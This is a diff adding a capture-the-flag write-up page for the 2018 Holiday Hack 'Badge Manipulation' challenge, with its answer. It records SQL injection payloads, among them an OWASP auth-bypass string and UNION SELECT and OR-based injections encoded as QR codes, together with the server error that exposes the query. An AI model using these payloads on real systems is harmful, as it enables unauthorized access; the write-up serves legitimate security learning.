@@ -86,7 +86,11 @@
 <li class="toctree-l1"><a class="reference internal" href="question3.html">Question 3: de Bruijn Sequences</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question4.html">Question 4: Data Repo Analysis</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question5.html">Question 5: AD Privilege Discovery</a></li>
-<li class="toctree-l1 current"><a class="current reference internal" href="#">Question 6: Badge Manipulation</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Question 6: Badge Manipulation</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#solution">Solution</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#other-succesful-injections">Other succesful injections</a></li>
+</ul>
+</li>
 <li class="toctree-l1"><a class="reference internal" href="question7.html">Question 7: HR Incident Response</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question8.html">Question 8: Network Traffic Forensics</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question9.html">Question 9</a></li>
@@ -177,6 +181,47 @@
             
   <div class="section" id="question-6-badge-manipulation">
 <h1>Question 6: Badge Manipulation<a class="headerlink" href="#question-6-badge-manipulation" title="Permalink to this headline">¶</a></h1>
+<div class="line-block">
+<div class="line">Bypass the authentication mechanism associated with the room near Pepper Minstix. <a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg">A sample employee badge is available</a> . What is the access control number revealed by the <a class="reference external" href="https://scanomatic.kringlecastle.com/index.html">door authentication panel</a>? For hints on achieving this objective, please visit Pepper Minstix and help her with the <a class="reference internal" href="../terminals/YuleLogAnalysis.html"><span class="doc">Yule Log Analysis</span></a> Cranberry Pi terminal challenge.</div>
+</div>
+<p>Answer: <em>19880715</em></p>
+<div class="section" id="solution">
+<h2>Solution<a class="headerlink" href="#solution" title="Permalink to this headline">¶</a></h2>
+<p>To solve this question we relied on the online <a class="reference external" href="https://www.the-qrcode-generator.com/">QR Code Generator</a> to generate the QR codes needed for the <a class="reference external" href="https://scanomatic.kringlecastle.com/index.html">Scanomatic door authentication panel</a>. We also utilised <code class="docutils literal notranslate"><span class="pre">Google</span> <span class="pre">Chrome</span> <span class="pre">-&gt;</span> <span class="pre">Developer</span> <span class="pre">Tools</span> <span class="pre">-&gt;</span> <span class="pre">Network</span> <span class="pre">-&gt;</span> <span class="pre">Response</span></code> to obtain the response from the door authentication panel.</p>
+<p>Using the hints associated with this question, we assumed that the aim of this challange was to utilise a <em>SQLi injection</em> attack. We initially created a QR code representing the SQL injection with the the Auth Bypass code recommended by OWASP: <code class="docutils literal notranslate"><span class="pre">or</span> <span class="pre">1--</span> <span class="pre">-'</span> <span class="pre">or</span> <span class="pre">1</span> <span class="pre">or</span> <span class="pre">'1&quot;or</span> <span class="pre">1</span> <span class="pre">or&quot;</span></code> The QR code looked like:</p>
+<img alt="../_images/qr1.png" src="../_images/qr1.png" />
+<p>This generated the following response:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="s2">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;Authorized User Account Has Been Disabled!&quot;</span><span class="p">,</span><span class="s2">&quot;request&quot;</span><span class="p">:</span><span class="n">false</span><span class="p">}</span>
+</pre></div>
+</div>
+<p>This indicated that we could either perform a SQL injection or simply meant that our input was safely handled by the door authentication panel.</p>
+<p>We then tried using a simple string with the hope that it would return some type of error. The string we used was <code class="docutils literal notranslate"><span class="pre">';test</span></code>. This generated the following response from the door authentication panel:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="s2">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;EXCEPTION AT (LINE 96 </span><span class="se">\&quot;</span><span class="s2">user_info = query(</span><span class="se">\&quot;</span><span class="s2">SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = &#39;</span><span class="si">{}</span><span class="s2">&#39; LIMIT 1</span><span class="se">\&quot;</span><span class="s2">.format(uid))</span><span class="se">\&quot;</span><span class="s2">): (1064, u</span><span class="se">\&quot;</span><span class="s2">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;test&#39; LIMIT 1&#39; at line 1</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span><span class="s2">&quot;request&quot;</span><span class="p">:</span><span class="n">false</span><span class="p">}</span>
+</pre></div>
+</div>
+<p>This was extremely helpful output because it showed the SQL query used by the panel including where our input was injected.</p>
+<p>We then tried to inject a valid SQL statement using <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">#</span></code> and obtained the following output:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="s2">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;No Authorized User Account Found!&quot;</span><span class="p">,</span><span class="s2">&quot;request&quot;</span><span class="p">:</span><span class="n">false</span><span class="p">}</span>
+</pre></div>
+</div>
+<p>Based on this information, we decided to generate a query that included a condition where the <strong>enabled</strong> field was evaluated to true. We tried <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">first_name,last_name,enabled</span> <span class="pre">FROM</span> <span class="pre">employees</span> <span class="pre">WHERE</span> <span class="pre">enabled</span> <span class="pre">=</span> <span class="pre">1</span> <span class="pre">#</span></code> and were successful. The QR code for this successful entry looked like:</p>
+<img alt="../_images/qr2.png" src="../_images/qr2.png" />
+<p>The response from the panel was:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="s2">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;User Access Granted - Control number 19880715&quot;</span><span class="p">,</span><span class="s2">&quot;request&quot;</span><span class="p">:</span><span class="n">true</span><span class="p">,</span><span class="s2">&quot;success&quot;</span><span class="p">:{</span><span class="s2">&quot;hash&quot;</span><span class="p">:</span><span class="s2">&quot;ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb&quot;</span><span class="p">,</span><span class="s2">&quot;resourceId&quot;</span><span class="p">:</span><span class="s2">&quot;false&quot;</span><span class="p">}}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="other-succesful-injections">
+<h2>Other succesful injections<a class="headerlink" href="#other-succesful-injections" title="Permalink to this headline">¶</a></h2>
+<p>After a bit of experimentation we found some alternative QR codes that consisted of the following statements:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39; UNION SELECT first_name,last_name,enabled FROM employees WHERE enabled = &#39;</span><span class="mi">1</span><span class="s1">&#39; LIMIT 1; -- {&#39;</span>
+</pre></div>
+</div>
+<p>and:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39; OR enabled = 1 #</span>
+</pre></div>
+</div>
+</div>
 </div>
 
 
